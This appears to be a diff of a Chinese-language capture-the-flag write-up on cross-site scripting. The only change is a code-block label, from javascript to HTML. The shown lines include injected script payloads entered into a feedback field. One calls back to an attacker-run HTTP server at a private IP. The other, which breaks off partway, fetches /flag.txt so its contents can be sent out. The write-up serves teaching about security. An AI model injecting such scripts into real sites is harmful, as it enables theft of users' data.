@@ -24,7 +24,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 接著在 feedback 的地方嘗試輸入以下 script 驗證是否會連線至我們起的 server
 
-```javascript
+```HTML
 <script>
     fetch('http://10.17.1.65:8000/')
 </script>
@@ -43,7 +43,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 現在只要寫一個 script 會讓目標把 flag.txt 的資料一起帶過來就可以了
 
-```javascript
+```HTML
 <script>
 fetch("/flag.txt", {method:'GET', mode:'no-cors'})
   .then(response => response.text())
